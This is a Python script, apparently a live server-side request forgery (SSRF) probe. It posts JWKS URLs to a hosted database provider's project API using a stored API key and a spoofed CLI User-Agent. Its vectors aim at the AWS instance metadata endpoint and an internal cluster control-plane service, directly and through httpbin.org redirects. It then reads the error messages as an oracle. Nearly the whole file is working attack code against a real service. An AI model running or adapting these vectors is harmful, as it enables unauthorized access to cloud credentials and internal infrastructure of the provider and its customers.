# -*- coding: utf-8 -*-
"""JWKS SSRF oracle 2:https metadata / redirect 绕过 / 有效 JWKS 对照"""
import http.client, ssl, json, time
ctx = ssl.create_default_context()
P = 'orange-sun-90493739'
key = json.load(open(r'D:\scan\neon_report\_apikey.json'))['key']
from _neon_creds_stage import API_HOST, API_BASE, HEADERS_TEST

def req(method, path, body=None):
    conn = http.client.HTTPSConnection(API_HOST, context=ctx, timeout=30)
    h = {'User-Agent': 'netlify-cli/17.0.0', 'Accept': 'application/json', 'Content-Type': 'application/json',
         'Authorization': 'Bearer ' + key}
    h.update(HEADERS_TEST)
    conn.request(method, API_BASE + path, body=json.dumps(body).encode() if body is not None else None, headers=h)
    r = conn.getresponse(); raw = r.read()
    st = r.status; conn.close()
    return st, raw

vecs = [
    ('https aws meta', 'https://169.254.169.254/latest/meta-data/'),
    ('httpbin->meta', 'https://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/'),
    ('httpbin->meta2', 'https://httpbin.org/redirect-to?url=http://169.254.169.254/'),
    ('httpbin->nul', 'https://httpbin.org/redirect-to?url=http://this-host-does-not-exist-zzz.invalid/'),
    ('httpbin->cplane', 'https://httpbin.org/redirect-to?url=http://neon-control-plane-api.neon-control-plane.svc.cluster.local:9096/'),
    ('httpbin self 200', 'https://httpbin.org/status/200'),
    ('httpbin json', 'https://httpbin.org/json'),
    ('google jwks real', 'https://www.googleapis.com/oauth2/v3/certs'),
]
for name, url in vecs:
    st, raw = req('POST', '/projects/%s/jwks' % P, {'jwks_url': url, 'provider_name': 'sec2-%s' % name[:8]})
    msg = ''
    try:
        msg = json.loads(raw).get('message', '')
    except Exception:
        msg = raw[:150].decode(errors='replace')
    print('%-22s [%s] -> %d | %s' % (name, url[:70], st, msg[:160]))
    time.sleep(1.2)
